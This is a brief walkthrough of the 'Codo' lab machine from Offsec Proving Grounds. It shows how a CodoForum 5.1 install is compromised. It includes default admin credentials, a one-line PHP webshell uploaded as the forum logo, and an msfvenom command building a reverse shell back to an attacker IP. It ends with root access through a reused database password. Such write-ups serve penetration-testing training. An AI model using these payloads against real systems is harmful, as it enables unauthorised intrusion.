# Codo

## Info

Codo is an easy rated linux machine from Offsec proving grounds.


## User

CodoForum 5.1 is vulnerable to a file upload RCE.

Admin credentials.

```
admin:admin
```

Change the forum logo to a php file.

```
dashboard > Global Settings > Change forum logo
```

Webshell

```
<?php system($_REQUEST["cmd"]); ?>
```

Access.

```
http://192.168.185.23/sites/default/assets/img/attachments/shell.php?cmd=id
```

Upload a shell.

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=4444 -f elf > shell
```

## Root

Enumerating the web application files, the following file contained password information.

```
/var/www/html/sites/default/config.php
```

Database credentials.

```
codo:FatPanda123
```

Password re-use allowed root access with database credentials.

```
su root
```
